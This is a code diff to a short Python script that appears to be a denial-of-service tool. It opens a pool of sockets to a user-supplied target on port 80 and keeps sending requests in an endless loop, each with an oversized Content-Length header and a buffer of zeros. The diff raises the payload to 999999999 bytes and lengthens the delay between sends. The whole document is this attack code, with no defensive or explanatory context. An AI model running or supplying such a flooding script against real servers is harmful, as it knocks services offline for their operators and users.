@@ -2,7 +2,7 @@ import socket
 
 HOST = "enter target url or ip"
 PORT = 80
-HEADERS = "Content-Length: 900000\r\nContent-Type: text/plain\r\n\r\n"
+HEADERS = "Content-Length: 999999999\r\nContent-Type: text/plain\r\n\r\n"
 POOL_SIZE = 10
 
 # Create a pool of sockets
@@ -12,7 +12,7 @@ for i in range(POOL_SIZE):
     pool.append(client)
 
 # Fill the message buffer with 0s
-message = b'0' * 900000
+message = b'0' * 999999999
 
 # Select a socket from the pool
 pool_index = 0
@@ -27,4 +27,4 @@ def send_request():
 import time
 while True:
     send_request()
-    time.sleep(0.1)
+    time.sleep(1)
